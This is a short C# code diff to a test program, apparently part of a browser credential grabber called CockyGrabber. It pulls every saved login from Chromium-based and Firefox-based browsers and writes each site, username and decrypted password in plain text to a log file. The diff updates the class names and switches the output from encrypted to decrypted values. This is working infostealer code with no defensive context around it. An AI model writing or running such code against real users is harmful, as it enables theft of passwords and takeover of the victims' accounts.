@@ -23,13 +23,13 @@ namespace CockyGrabberTest
             };
 
             // Grab logins and store the URLs, Usernames and Passwords in 'logins':
-            foreach (Chromium.Login c in g.GetAllChromiumLogins())
+            foreach (Blink.Login c in g.GetAllChromiumLogins())
             {
-                logins.Add($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.PasswordValue}");
+                logins.Add($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.DecryptedPasswordValue}");
             }
-            foreach (Firefox.Login c in g.FG.GetLogins())
+            foreach (Gecko.Login c in g.FG.GetLogins())
             {
-                logins.Add($"Website: {c.Hostname} | Username: {c.EncryptedUsername} | Password: {c.EncryptedPassword}");
+                logins.Add($"Website: {c.Hostname} | Username: {c.DecryptedUsername} | Password: {c.DecryptedPassword}");
             }
 
             File.AppendAllLines(LogFilePath, logins); // Append the grabbed Logins to the log file
